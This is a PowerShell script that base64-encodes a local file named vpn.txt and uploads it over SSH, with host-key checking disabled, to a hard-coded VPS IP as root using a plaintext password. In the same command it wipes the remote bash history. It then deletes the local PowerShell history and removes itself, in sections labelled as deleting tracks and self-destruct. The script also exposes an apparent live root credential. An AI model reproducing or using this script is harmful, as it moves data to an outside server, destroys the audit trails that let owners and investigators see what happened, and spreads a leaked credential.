# ==========================================
# 1. ENTER YOUR DETAILS HERE
# ==========================================
$vps_ip      = "149.104.76.115"
$username    = "root"
$password    = "dde-703-45-a-aA!"
$localfile   = "C:\Users\user1\Downloads\vpn.txt"
$remotefile  = "/home/baby"

# ==========================================
# 2. AUTOMATIC DEPENDENCY CHECK
# ==========================================
if (-not (Get-Command sshpass -ErrorAction SilentlyContinue)) {
    Write-Host "Installing required SSH helper tool..." -ForegroundColor Cyan
    winget install Gyan.sshpass --silent --accept-source-agreements --accept-package-agreements
    # Refresh environment path so the script can use sshpass immediately
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

# ==========================================
# 3. CONVERT AND TRANSFER
# ==========================================
Write-Host "Converting file to Base64 and uploading..." -ForegroundColor Cyan
$base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($localfile))
$env:SSHPASS = $password

# Execute the transfer and wipe the Linux bash history in the same breath
sshpass -e ssh -o StrictHostKeyChecking=no "$username@$vps_ip" "echo '$base64' | base64 -d > '$remotefile' && history -c && cat /dev/null > ~/.bash_history && history -w"

# ==========================================
# 4. TOTAL CLEANUP (DELETING TRACKS)
# ==========================================
Write-Host "Cleaning up all session data and history..." -ForegroundColor Yellow

# Wipe variables from RAM
$password = $null
$env:SSHPASS = $null
$base64 = $null

# Clear the PowerShell history file completely
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

# Self-destruct: Delete this script file automatically from the hard drive
if ($MyInvocation.PSCommandPath) {
    Remove-Item $MyInvocation.PSCommandPath -Force -ErrorAction SilentlyContinue
}

Write-Host "Done. Transfer complete and all history wiped." -ForegroundColor Green
